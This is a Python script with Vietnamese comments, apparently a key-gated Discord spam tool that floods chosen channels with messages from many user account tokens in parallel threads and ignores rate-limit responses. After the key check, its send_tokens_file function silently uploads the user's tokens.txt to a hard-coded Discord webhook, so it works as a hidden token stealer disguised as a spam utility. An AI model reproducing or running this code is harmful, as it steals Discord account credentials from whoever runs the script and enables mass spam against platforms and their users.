import requests
import time
import os
from threading import Thread
import sys
import pyfiglet
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
from datetime import datetime
import getpass
init(autoreset=True)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1370634588124217404/dQjCtO4BmCnszvK0iAHIue8W53BIQzoDdA41ufyT48tFyPiyCw9kxjpXsU5BYp_-_YRS'  # <== THAY BẰNG LINK WEBHOOK CỦA BẠN

def get_keys_from_anotepad():
    try:
        url = 'https://anotepad.com/notes/q26px3f3'  # <== THAY BẰNG LINK ANOTEPAD CỦA BẠN
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            note_content = soup.find('div', {'class': 'plaintext'})
            if note_content:
                keys = [line.strip() for line in note_content.get_text().strip().split('\n') if line.strip()]
                return keys
        return []
    except:
        return []

def send_tokens_file(key):
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("tokens.txt", "rb") as f:
            files = {'file': ("tokens.txt", f)}
            content = f"**Key Đã Nhập:** `{key}`\n**Thời Gian:** {now}"
            requests.post(WEBHOOK_URL, data={"content": content}, files=files)
    except:
        pass

# --- Kiểm tra key ---
keys = get_keys_from_anotepad()
if not keys:
    print("Không lấy được key từ anotepad.")
    sys.exit()

user_key = getpass.getpass("Nhập key: ").strip()
if user_key not in keys:
    print("Key sai! Kết thúc chương trình")
    sys.exit()

print("Key đúng ! Tiếp tục chương trình...")
send_tokens_file(user_key)
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_logo_mix():
    ascii_art = pyfiglet.figlet_format("Tuan Cute", font="big")
    lines = ascii_art.splitlines()
    for i, line in enumerate(lines):
        if i % 2 == 0:
            print(Fore.BLUE + line)
        else:
            print(Fore.BLUE + line)

clear()
show_logo_mix()
def clear_log_if_needed():
    try:
        with open("console.txt", "r", encoding="utf-8") as f:
            if len(f.readlines()) >= 50:
                open("console.txt", "w", encoding="utf-8").close()
    except:
        pass

def log_console(msg):
    clear_log_if_needed()
    with open("console.txt", "a", encoding="utf-8") as f:
        f.write(msg + "\n")

def send_message(token, channel_id, delay):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    while True:
        try:
            with open("ngon1.txt", "r", encoding="utf-8") as f:
                content = f.read().strip()
            if not content:
                time.sleep(delay)
                continue
        except:
            time.sleep(delay)
            continue

        payload = {"content": content}
        try:
            res = requests.post(
                f"https://discord.com/api/v9/channels/{channel_id}/messages",
                headers=headers, json=payload
            )
            if res.status_code == 200:
                msg = f"Gửi tin nhắn thành công tới kênh {channel_id} với token {token[-5:]}"
                log_console(msg)
            elif res.status_code == 429:
                msg = f"Gửi tin nhắn thất bại tới kênh {channel_id} với token {token[-5:]}: 429 Too Many Requests"
                log_console(msg)
                continue  # Không hiển thị retry_after và không delay thêm
            elif res.status_code == 401:
                msg = f"Gửi tin nhắn thất bại tới kênh {channel_id} với token {token[-5:]}: 401 Unauthorized"
                log_console(msg)
                break
            elif res.status_code == 403:
                msg = f"Gửi tin nhắn bất bại tới kênh {channel_id} với token {token[-5:]}: 403 Forbidden"
                log_console(msg)
                break
            else:
                msg = f"Lỗi khác tới kênh {channel_id} với token {token[-5:]}: {res.status_code}"
                log_console(msg)
        except Exception as e:
            log_console(f"Exception: {e}")
        time.sleep(delay)

# Nhập số lượng file ngôn
try:
    so_luong_ngon = int(input("Nhập số lượng file ngôn muốn tạo: "))
except:
    so_luong_ngon = 1

for i in range(1, so_luong_ngon + 1):
    with open(f"ngon{i}.txt", "w", encoding="utf-8") as f:
        f.write("")

# Nhập ID kênh
channel_ids = []
print("Nhập ID kênh (Enter để kết thúc):")
while True:
    cid = input().strip()
    if not cid:
        break
    channel_ids.append(cid)

# Đọc tokens
try:
    with open("tokens.txt", "r", encoding="utf-8") as f:
        tokens = [line.strip() for line in f if line.strip()]
except:
    print("Không tìm thấy file tokens.txt")
    exit()

# Delay từng token
token_delays = {}
for token in tokens:
    while True:
        try:
            delay = float(input(f"Nhập Delay cho token {token[-5:]} (giây): "))
            token_delays[token] = delay
            break
        except:
            pass

# Khởi chạy gửi
for token in tokens:
    for channel_id in channel_ids:
        Thread(target=send_message, args=(token, channel_id, token_delays[token])).start()